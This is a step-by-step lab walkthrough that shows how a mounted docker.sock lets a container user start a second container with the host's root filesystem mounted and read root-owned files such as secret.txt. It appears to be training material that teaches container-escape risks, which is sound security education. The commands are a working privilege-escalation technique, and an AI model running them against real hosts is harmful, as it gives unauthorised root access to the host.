## Docker Daemon Direct Access

###### A malicious user who gains access to `docker.sock` of host machine can gain `root` access to the host machine.

###### Docker-Socket is responsible for communication with the Docker Service. When the docker-socket is mounted on-to a container, docker containers can be launched from the running container via. the socket causing `container breakout`

##### Step 1:

* Open Terminal

![](img/Open-Terminal.png)


##### Step 2: 
  
* Run `sudo su we45` to login as a normal user.

```commandline
root@we45:~# sudo su we45
we45@we45:~$
```

##### Step 3: 
    
* Launch a container by mounting the `docker.sock` which can be found in `/var/run` .


```commandline
docker run -d -v /var/run/docker.sock:/var/run/docker.sock --name helloworld helloworld
```

 
##### Step 4:   

* View all running containers.

```commandline
docker ps
```

```commandline
we45@we45:~$ docker ps
CONTAINER ID        IMAGE                    COMMAND             CREATED              STATUS              PORTS               NAMES
1681e86d567e        helloworld:latest   "python app.py"     About a minute ago   Up About a minute   5050/tcp            helloworld/tcp            helloworld
```
    
##### Step 5:   

* Run `docker exec -it helloworld /bin/bash` to exec into a running container.

```commandline
we45@we45:~$ docker exec -it helloworld bash
root@1681e86d567e:/apps# 
```

##### Step 6:

*  Inside the `helloworld` container, docker images and containers of the host machine can be accessed

```commandline
docker images
```

```commandline
docker ps
```

```commandline
root@1681e86d567e:/apps# docker ps
CONTAINER ID        IMAGE                    COMMAND             CREATED              STATUS              PORTS               NAMES
1681e86d567e        helloworld:latest   "python app.py"     About a minute ago   Up About a minute   5050/tcp            helloworld/tcp            helloworld
root@b412be8326b5:/apps#
```

##### Step 7

* Launch another container from the `helloworld` container and mount the root-directory.

```commandline
docker run -ti -v /:/hostFS ubuntu:16.04 /bin/bash
```

```commandline
root@1681e86d567e:/apps# docker run -ti -v /:/hostFS ubuntu:16.04 /bin/bash
root@b412be8326b5:/#
```

###### Since `docker.sock` belongs to the host machine, when a container is launched the mounted root-directory belongs to the host-machine causing `container breakout`

##### Step 8:

* Run `cd /hostFS/root/` to access the mounted host directory. Run `ls` to check the secret.txt file inside a container.

```commandline
/ # cd /hostFS/root/
/hostFS/root # 
/hostFS/root # ls
secret.txt
```
    
##### Step 9:

* Run `cat secret.txt` to view the content of the file.

```commandline
/hostFS/root # cat secret.txt
secret
``` 
    
###### Note: Malicious user now has complete access to the root Filesystem of the host machine.

##### Step 10:

* Run `exit` multiple times to exit from the container(s).

```commandline
root@b412be8326b5:/hostFS/root# exit
exit
root@1681e86d567e:/apps# exit
exit
we45@we45:~$
```
    
##### Stop all running docker containers

* Run `clean-docker` to stop all the containers

```commandline
root@we45:~$ clean-docker
```
